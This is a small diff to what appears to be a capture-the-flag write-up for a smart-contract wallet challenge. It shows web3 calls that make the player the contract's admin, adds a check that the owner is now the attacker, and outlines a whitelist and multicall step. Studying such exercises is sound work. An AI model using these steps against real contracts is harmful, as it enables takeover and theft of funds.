@@ -5,6 +5,7 @@
 - `fnSig = {name: 'proposeNewAdmin', type: 'function', inputs: [{type: 'address', name: '_newAdmin'}]}`
 - `data = web3.eth.abi.encodeFunctionCall(fnSig, [player])`
 - `await web3.eth.sendTransaction({from: player, to: contract.address, data})`
+- confirm with: `await contract.owner()`; should be address of attacker
 
 2. Add attacker to `whitelisted`, in order to access implementation functions; `multicall` `execute` `setMaxBalance`
 
